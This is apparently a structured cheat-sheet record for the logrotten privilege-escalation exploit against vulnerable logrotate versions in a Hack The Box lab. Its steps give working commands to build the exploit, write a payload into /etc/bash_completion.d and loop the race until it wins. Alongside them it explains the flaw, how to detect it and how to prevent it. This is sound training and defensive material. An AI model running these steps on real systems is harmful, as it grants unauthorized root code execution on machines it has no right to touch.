examples.label: Check logrotate uses 'create' mode (required for exploit)
Win the rotate race to run the payload as root

notes: Target /etc/bash_completion.d (sourced by every bash login). If root's reset.sh wipes /tmp, write the flag to your home dir instead. Determine mode: grep "create\|compress" /etc/logrotate.conf | grep -v "#".

recommended.note: Confirm a vulnerable logrotate version first.
Find the writable log that root rotates.

name: Logrotate - logrotten Exploit
description: Vulnerable logrotate (3.8.6/3.11.0/3.15.0/3.18.0) run as root on a log you can write lets logrotten win a race to execute a payload as root, typically dropped into /etc/bash_completion.d.

steps.label: 2. Build logrotten + payload
steps.command:
git clone https://github.com/whotwagner/logrotten.git; cd logrotten
gcc -static logrotten.c -o logrotten_static
echo 'cat /root/flag.txt > /home/htb-student/flag.txt && chmod 644 /home/htb-student/flag.txt' > payload

steps.label: 3. Spam the race loop
steps.command: while true; do echo "x" >> /home/htb-student/backups/access.log 2>/dev/null; timeout 6 ./logrotten -p ./payload /home/htb-student/backups/access.log 2>/dev/null; sleep 1; done

defense.why_it_works: logrotten exploits a TOCTOU race condition in logrotate's 'create' directive. When logrotate renames a log file before creating a new one, logrotten uses inotify to detect the rename and replaces the log directory with a symlink to /etc/bash_completion.d. Logrotate then creates the new log file at the symlink target, giving root ownership. The attacker's payload in that file is executed when root next opens a bash login shell.
defense.prerequisites: A log file writable by the attacker. logrotate running as root (via cron). logrotate configured with the 'create' directive (not 'copytruncate'). Vulnerable logrotate versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0.
defense.impact: Code execution as root when root next logs in via bash. Attacker can read /root/flag.txt, add sudoers entries, install backdoors, or achieve persistent root access.
defense.detection: inotify watch on log directories (unusual). Unexpected creation of files in /etc/bash_completion.d by logrotate process. File integrity monitoring on /etc/bash_completion.d. auditd: write to /etc/bash_completion.d by non-root.
defense.artifacts: File integrity alert (/etc/bash_completion.d/ modified) | Auditd: logrotate creating file in unexpected path | Payload execution in bash audit log
defense.prevention: Update logrotate to a patched version. Use 'copytruncate' instead of 'create' in logrotate configs for attacker-writable log files. Ensure logrotate-handled log directories are not writable by low-privileged users. Apply SELinux policy to restrict logrotate's file creation scope.
defense.misconfiguration: Attacker-writable log file (/home/htb-student/backups/access.log) processed by root-run logrotate with the 'create' directive. logrotate version 3.11.0 (vulnerable to race condition).
defense.vulnerable_config:
# Vulnerable logrotate config
/home/htb-student/backups/access.log {
  missingok
  daily
  create  # <-- vulnerable directive (use copytruncate instead)
  rotate 7
}

# logrotate version
logrotate --version
# logrotate 3.11.0  <- vulnerable
defense.secure_config:
# Use copytruncate to avoid race condition
/home/htb-student/backups/access.log {
  missingok
  daily
  copytruncate  # copies then truncates -- no rename race
  rotate 7
}

# Ensure log files not writable by non-root
chown root:root /home/htb-student/backups/access.log
chmod 640 /home/htb-student/backups/access.log

# Update logrotate
apt install --only-upgrade logrotate
defense.evasion: Race window is tiny -- loop logrotten continuously to win the race. Use inotify-based triggering (built into logrotten) for reliable exploitation.
